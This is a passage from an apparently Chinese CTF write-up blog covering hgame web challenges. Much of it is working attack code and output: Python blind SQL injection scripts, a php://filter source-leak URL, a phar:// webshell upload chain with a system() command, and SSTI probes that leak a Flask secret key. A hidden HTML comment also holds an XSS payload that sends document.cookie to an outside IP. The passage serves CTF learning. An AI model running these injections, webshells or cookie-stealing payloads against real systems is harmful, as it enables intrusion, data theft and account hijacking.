title=\"sqli-2\"></a>sqli-2</h2><p>依然数字型注入，只不过是盲注，本来不想写代码的，哎，还是逃不过。</p>\n<p>PS：由于没注意看题目，结果直接上来时间盲注了，但是等的真的绝望，后来才回过味来可以bool盲注，速度才上来了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">cookies = &#123;<span class=\"string\">'PHPSESSID'</span>:<span class=\"string\">'lseqgohjo9eibfivnemk6sa8vd'</span>&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(_in)</span>:</span></span><br><span class=\"line\">    m = hashlib.md5()</span><br><span class=\"line\">    m.update(_in.encode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> m.hexdigest()[<span class=\"number\">0</span>:<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_code</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> url</span><br><span class=\"line\">    res = requests.get(url, cookies=cookies).text</span><br><span class=\"line\">    code = re.findall(<span class=\"string\">r'=== (.&#123;4&#125;)&lt;br&gt;'</span>,res)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">9999999999999</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> code == md5(str(i)):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> str(i)</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://118.89.111.179:3001/\"</span></span><br><span class=\"line\">output = <span class=\"string\">\"hgame&#123;sqli_1s_s0_\"</span></span><br><span class=\"line\">succ = <span class=\"string\">\"sql error\"</span></span><br><span class=\"line\">name_dic = string.digits + string.ascii_lowercase + string.ascii_uppercase + <span class=\"string\">'_&#123;&#125;'</span>  + <span class=\"string\">','</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">18</span>,<span class=\"number\">60</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> name_dic:</span><br><span class=\"line\">        code = get_code()</span><br><span class=\"line\">        <span class=\"comment\"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;str(i)&#125;,1)=\"&#123;str(j)&#125;\"),0,sleep(5))--+'</span></span><br><span class=\"line\">        <span class=\"comment\"># F11111114G,WORDS</span></span><br><span class=\"line\">        <span class=\"comment\"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name=\"F11111114G\"),&#123;str(i)&#125;,1)=\"&#123;str(j)&#125;\"),0,sleep(5))--+'</span></span><br><span class=\"line\">        <span class=\"comment\"># FL4444AG</span></span><br><span class=\"line\">        payload = <span class=\"string\">f'?code=<span class=\"subst\">&#123;code&#125;</span>&amp;id=1 and if((substr((select FL4444AG from F11111114G),<span class=\"subst\">&#123;str(i)&#125;</span>,1)=binary \"<span class=\"subst\">&#123;str(j)&#125;</span>\"),sleep(-5),1)--+'</span></span><br><span class=\"line\">        res = requests.get(url+payload,cookies=cookies).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> succ <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">            output += j</span><br><span class=\"line\">            print(<span class=\"string\">\"output: \"</span>,output)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p>flag如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"基础渗透\"><a href=\"#基础渗透\" class=\"headerlink\" title=\"基础渗透\"></a>基础渗透</h2><p>正常注册登录，发现在点击不同的功能的时候是通过action参数来实现的，比如看到有<code>action=message</code>，猜测是不是存在文件包含，访问message.php页面发现果真存在，尝试文件包含</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;111.231.140.29:10080&#x2F;index.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></figure>\n<p>得到源码<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include_once</span>(<span class=\"string\">\"template/header.php\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (is_null($_SESSION[<span class=\"string\">'user_id'</span>])) &#123;</span><br><span class=\"line\">    header(<span class=\"string\">'Location:/login.php'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$page = array_key_exists(<span class=\"string\">'action'</span>, $_GET) ? $_GET[<span class=\"string\">'action'</span>] : <span class=\"string\">'message'</span>;</span><br><span class=\"line\"><span class=\"keyword\">require</span> $page .<span class=\"string\">'.php'</span>;</span><br><span class=\"line\"><span class=\"keyword\">include_once</span>(<span class=\"string\">\"template/footer.php\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>functions.php<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//ini_set(\"display_errors\", \"on\");</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">'config.php'</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sql_query</span><span class=\"params\">($sql_query)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $mysqli;</span><br><span class=\"line\">    $res = $mysqli-&gt;query($sql_query);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">csrf_token</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $token = <span class=\"string\">''</span>;</span><br><span class=\"line\">    $chars = str_split(<span class=\"string\">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>; $i &lt; <span class=\"number\">48</span>; $i++) &#123;</span><br><span class=\"line\">        $token = $token . $chars[random_int(<span class=\"number\">0</span>, <span class=\"number\">61</span>)];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">'token'</span>] = $token;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;input type='hidden' value='$token' id='token'&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">res_to_json</span><span class=\"params\">($res, $type)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $json[<span class=\"string\">'type'</span>] = $type;</span><br><span class=\"line\">    $json[<span class=\"string\">'status'</span>] = <span class=\"string\">\"true\"</span>;</span><br><span class=\"line\">    $json[<span class=\"string\">\"content\"</span>] = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($res <span class=\"keyword\">as</span> $message) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        $array_tmp[<span class=\"string\">'user_id'</span>] = $message[<span class=\"string\">'user_id'</span>];</span><br><span class=\"line\">        $array_tmp[<span class=\"string\">'user'</span>] = $message[<span class=\"string\">'user'</span>];</span><br><span class=\"line\">        $array_tmp[<span class=\"string\">'avatar'</span>] = get_avatar($message[<span class=\"string\">'user_id'</span>]) != <span class=\"keyword\">null</span> ? get_avatar($message[<span class=\"string\">'user_id'</span>])[<span class=\"string\">'content'</span>] : md5($message[<span class=\"string\">'user'</span>]);</span><br><span class=\"line\">        $array_tmp[<span class=\"string\">'message'</span>] = $message[<span class=\"string\">'content'</span>];</span><br><span class=\"line\">        $array_tmp[<span class=\"string\">'message_id'</span>] = $message[<span class=\"string\">'message_id'</span>];</span><br><span class=\"line\">        $array_tmp[<span class=\"string\">'time'</span>] = $message[<span class=\"string\">'date'</span>];</span><br><span class=\"line\">        array_push($json[<span class=\"string\">\"content\"</span>], $array_tmp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $json[<span class=\"string\">\"content\"</span>] = $json[<span class=\"string\">\"content\"</span>];</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json_encode($json);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">judge</span><span class=\"params\">($username, $password)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($username == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"username's length error!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">elseif</span> (strlen($password) &lt; <span class=\"number\">6</span> <span class=\"keyword\">or</span> strlen($password) &gt; <span class=\"number\">16</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"password's length error!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">register</span><span class=\"params\">($username, $password, $token)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (judge($username, $password) == <span class=\"number\">1</span> <span class=\"keyword\">and</span> $token === $_SESSION[<span class=\"string\">'token'</span>]) &#123;</span><br><span class=\"line\">        $password = md5($password);</span><br><span class=\"line\">        $sql_query = <span class=\"string\">\"insert into `users`(`username`,`password`) VALUES ('$username','$password')\"</span>;</span><br><span class=\"line\">        $res = sql_query($sql_query);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($res) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'register success!'</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'error!'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"error!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($username, $password, $token)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($_SESSION[<span class=\"string\">'login'</span>]) <span class=\"keyword\">and</span> $token === $_SESSION[<span class=\"string\">'token'</span>]) &#123;</span><br><span class=\"line\">        $password = md5($password);</span><br><span class=\"line\">        $sql_query = <span class=\"string\">\"select * from `users` where `username`='$username' and `password`='$password'\"</span>;</span><br><span class=\"line\">        $res = sql_query($sql_query);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($res-&gt;num_rows) &#123;</span><br><span class=\"line\">            $data = $res-&gt;fetch_array();</span><br><span class=\"line\">            $_SESSION[<span class=\"string\">'user_id'</span>] = $data[<span class=\"string\">'user_id'</span>];</span><br><span class=\"line\">            $_SESSION[<span class=\"string\">'user'</span>] = $data[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">            $_SESSION[<span class=\"string\">'groups'</span>] = $data[<span class=\"string\">'groups'</span>];</span><br><span class=\"line\">            $_SESSION[<span class=\"string\">'login'</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">            setcookie(<span class=\"string\">'user'</span>, $_SESSION[<span class=\"string\">'user'</span>]);</span><br><span class=\"line\">            setcookie(<span class=\"string\">'groups'</span>, $_SESSION[<span class=\"string\">'groups'</span>]);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"error!\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"error!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loginout</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'loginout'</span>] === $_SESSION[<span class=\"string\">'token'</span>]) &#123;</span><br><span class=\"line\">        session_destroy();</span><br><span class=\"line\">        setcookie(<span class=\"string\">'groups'</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        setcookie(<span class=\"string\">'user'</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        Header(<span class=\"string\">\"Location: index.php\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_avatar</span><span class=\"params\">($user_id)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $sql_query = <span class=\"string\">\"select `avatar` from `users` where `user_id`=$user_id\"</span>;</span><br><span class=\"line\">    $res = sql_query($sql_query)-&gt;fetch_row()[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($res) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">array</span>(<span class=\"string\">'name'</span> =&gt; $res, <span class=\"string\">'content'</span> =&gt; base64_encode(file_get_contents(<span class=\"string\">'./img/avatar/'</span> . $res . <span class=\"string\">'.png'</span>)));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_new_messages</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $start = $_GET[<span class=\"string\">'start'</span>] ?? <span class=\"number\">0</span>;</span><br><span class=\"line\">    $start = addslashes($start);</span><br><span class=\"line\">    $user_id = $_SESSION[<span class=\"string\">'user_id'</span>];</span><br><span class=\"line\">    $sql_query = <span class=\"string\">\"select * from `messages` where `user_id`=$user_id LIMIT $start,999999999999\"</span>;</span><br><span class=\"line\">    $res = sql_query($sql_query);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($res-&gt;num_rows) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res_to_json($res, <span class=\"string\">\"messages\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_messages</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $start = $_GET[<span class=\"string\">'start'</span>] ?? <span class=\"number\">0</span>;</span><br><span class=\"line\">    $start = addslashes($start);</span><br><span class=\"line\">    $user_id = $_SESSION[<span class=\"string\">'user_id'</span>];</span><br><span class=\"line\">    $sql_query = <span class=\"string\">\"select * from `messages` where `user_id`=$user_id ORDER BY `message_id` DESC LIMIT $start,12\"</span>;</span><br><span class=\"line\">    $res = sql_query($sql_query);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($res-&gt;num_rows) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res_to_json($res, <span class=\"string\">\"messages\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add_message</span><span class=\"params\">($message)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_POST[<span class=\"string\">'token'</span>] === $_SESSION[<span class=\"string\">'token'</span>]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_SESSION[<span class=\"string\">'login'</span>]) <span class=\"keyword\">and</span> mb_strlen($message) &gt; <span class=\"number\">6</span>) &#123;</span><br><span class=\"line\">            $user_id = $_SESSION[<span class=\"string\">'user_id'</span>];</span><br><span class=\"line\">            $user = $_SESSION[<span class=\"string\">'user'</span>];</span><br><span class=\"line\">            $sql_query = <span class=\"string\">\"insert into `messages`(`user_id`,`user`,`content`) VALUES($user_id,'$user','$message')\"</span>;</span><br><span class=\"line\">            sql_query($sql_query);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">elseif</span> (!<span class=\"keyword\">isset</span>($_SESSION[<span class=\"string\">'login'</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"login error\"</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"length error\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">delete_message</span><span class=\"params\">($message_id)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $user_id = $_SESSION[<span class=\"string\">'user_id'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_POST[<span class=\"string\">'token'</span>] === $_SESSION[<span class=\"string\">'token'</span>]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($_SESSION[<span class=\"string\">'groups'</span>] == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            $sql_query = <span class=\"string\">\"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id\"</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">elseif</span> ($_SESSION[<span class=\"string\">'groups'</span>] == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            $sql_query = <span class=\"string\">\"delete from `messages` where `message_id`=$message_id\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        sql_query($sql_query);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">rand_filename</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $tmp = `cat /dev/urandom | head -n <span class=\"number\">10</span> | md5sum | head -c <span class=\"number\">15</span>`;</span><br><span class=\"line\">    $sql_query = <span class=\"string\">\"select `avatar` from `users` where `avatar`=$tmp\"</span>;</span><br><span class=\"line\">    $res = sql_query($sql_query);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($res-&gt;num_rows) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> rand_filename();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload_avatar</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $type = $_FILES[<span class=\"string\">'file'</span>][<span class=\"string\">'type'</span>];</span><br><span class=\"line\">    $user_id = $_SESSION[<span class=\"string\">'user_id'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($type == <span class=\"string\">'image/gif'</span> || $type == <span class=\"string\">'image/jpeg'</span> || $type == <span class=\"string\">'image/png'</span>) &#123;</span><br><span class=\"line\">        $avatar = get_avatar($user_id);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($avatar == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            $name = rand_filename();</span><br><span class=\"line\">            move_uploaded_file($_FILES[<span class=\"string\">'file'</span>][<span class=\"string\">'tmp_name'</span>], <span class=\"string\">\"./img/avatar/\"</span> . $name . <span class=\"string\">\".png\"</span>);</span><br><span class=\"line\">            $sql_query = <span class=\"string\">\"update `users` set `avatar`='$name' WHERE `user_id`=$user_id\"</span>;</span><br><span class=\"line\">            sql_query($sql_query);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            move_uploaded_file($_FILES[<span class=\"string\">'file'</span>][<span class=\"string\">'tmp_name'</span>], <span class=\"string\">\"./img/avatar/\"</span> . $avatar[<span class=\"string\">'name'</span>] . <span class=\"string\">\".png\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">change_password</span><span class=\"params\">($opassword, $npassword, $npasswod_again)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (judge($_SESSION[<span class=\"string\">'user'</span>], $npassword)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($npasswod_again !== $npassword) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"difference error\"</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $user_id = $_SESSION[<span class=\"string\">'user_id'</span>];</span><br><span class=\"line\">            $sql_query = <span class=\"string\">\"select `password` from `users` where `user_id`=$user_id\"</span>;</span><br><span class=\"line\">            $res = sql_query($sql_query);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ($res-&gt;num_rows) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ($res-&gt;fetch_row()[<span class=\"number\">0</span>] === md5($opassword)) &#123;</span><br><span class=\"line\">                    $sql_query = <span class=\"string\">\"update `users` set `password`=md5($npassword) WHERE `user_id`=$user_id\"</span>;</span><br><span class=\"line\">                    $res = sql_query($sql_query);</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> $res;</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">\"successful\"</span>;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">\"oldpassword error\"</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>审计代码可知，存在一处图片上传，但是不知道文件名，题目中有很多sql语句，都用addslashes()函数转义过了，字符型注入无法实施，但是在delete_message中存在数字型注入<code>$sql_query = “delete from <code>messages</code> where <code>message_id</code>=$message_id and <code>user_id</code>=$user_id”;</code>，参数可控且没有单引号（addslashes()过滤无效），我们可以通过时间盲注来获取我们当前用户对应的文件名，token是一次一刷新，需要每次都获取，代码如下<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">cookies = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"groups\"</span>:<span class=\"string\">\"0\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"PHPSESSID\"</span>:<span class=\"string\">\"c419fq3ppu11r1o2tra4l9rlnm\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"user\"</span>:<span class=\"string\">\"snowtest\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url_del = <span class=\"string\">'http://111.231.140.29:10080/messages_api.php?action=delete'</span></span><br><span class=\"line\">url = <span class=\"string\">'http://111.231.140.29:10080/index.php?action=message'</span></span><br><span class=\"line\">message = <span class=\"string\">\"7469 and if(ascii((substr((select avatar from users where username like 0x736e6f777425 limit 1),&#123;&#125;,1)))=&#123;&#125;,sleep(5),0)#\"</span></span><br><span class=\"line\">avatar = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">100</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">34</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">        r = requests.get(url,cookies=cookies)</span><br><span class=\"line\">        token = re.findall(<span class=\"string\">r\"value='(.*)' id='token'&gt;\"</span>,r.text)[<span class=\"number\">0</span>]</span><br><span class=\"line\">        data = dict(token=token,message_id=message.format(i,j))</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = requests.post(url_del,cookies=cookies,data=data,timeout=<span class=\"number\">4</span>)  </span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            avatar += chr(j)</span><br><span class=\"line\">            print(avatar)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure><br>可以得到我的账号对应的文件名为<code>1bce72251d3c333</code>，在upload_avatar()中会在文件名后面强行拼接png后缀<code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;./img/avatar/&quot; . $name . &quot;.png&quot;);</code>，也就是最终上传的文件名会被命名为<code>1bce72251d3c333.png</code>，如果直接写入shell肯定是无法执行的，不过前面我们读源码的时候利用了<code>require $page .&#39;.php&#39;;</code>，所以我们可以利用phar协议来getshell，在本地写一个shell，然后打包为zip文件，修改文件头并上传</p>\n<p><img src=\"https://i.loli.net/2019/02/19/5c6bdd1d45b16.png\" alt><br>然后上传，之后访问<code>http://111.231.140.29:10080/index.php?action=phar://img/avatar/1bce72251d3c333.png/shell</code>即可getshell</p>\n<p>然后就是文件探测了，可以使用find命令<code>snow=system(&#39;find / -name &quot;*flag*&quot;&#39;);</code>，最终payload</p>\n<p><img src=\"https://i.loli.net/2019/02/19/5c6bde110e9a2.png\" alt></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hgame&#123;e4616b38e22d1a22cedc53a90cfaa87f75ccbfe565399857a390950a58a94e68&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"BabyXss\"><a href=\"#BabyXss\" class=\"headerlink\" title=\"BabyXss\"></a>BabyXss</h2><p>题目环境有点问题</p>\n<!-- <scr<script>ipt>$.get('http://120.77.176.134/?cookie=' + document.cookie);</scr<script>ipt> -->\n<h1 id=\"WEEK-4\"><a href=\"#WEEK-4\" class=\"headerlink\" title=\"WEEK-4\"></a>WEEK-4</h1><h2 id=\"happypython\"><a href=\"#happypython\" class=\"headerlink\" title=\"happypython\"></a>happypython</h2><p>python下的ssti，自己当时做的时候想到了要获取secret_key的思路，但是可惜没想到ssti，自己对框架相关问题了解的太少了，以后要在这方面加强一下，简单测试一下可以发现该框架是存在模板注入的问题的<code>http://118.25.18.223:3001/{{1+1}}</code></p>\n<p><img src=\"https://i.loli.net/2019/02/26/5c7529f34783c.png\" alt></p>\n<p>接下来读取配置文件<code>http://118.25.18.223:3001/{{config}}</code>，可以获取到secret_key</p>\n<p><img src=\"https://i.loli.net/2019/02/26/5c752a50e3200.png\" alt></p>\n<p>解一下cookie</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python session.py decode -c .eJwlj0FqQzEMBe_idRaSLMl2LvORZYmGQAv_J6vSu8fQ1ayGee-3HHnG9VXur_Mdt3I8VrkXEETAdKvkc1EbK5fG0D4oXKR3DND0qSbUGy1gHwTeONI8RxCLVOWuWmU2iC27qzNrwuSKCpDTbCipEfQxyY3Fos2-nGKWW_HrzOP184zvvUexCUtm3wzlXRAbKQwzrCOtMJJel2zvfcX5fwIRy98HJ4Y_iA.XHUmGA.wO2v6jNOPBHknlA5tAqik2bE_hI -s 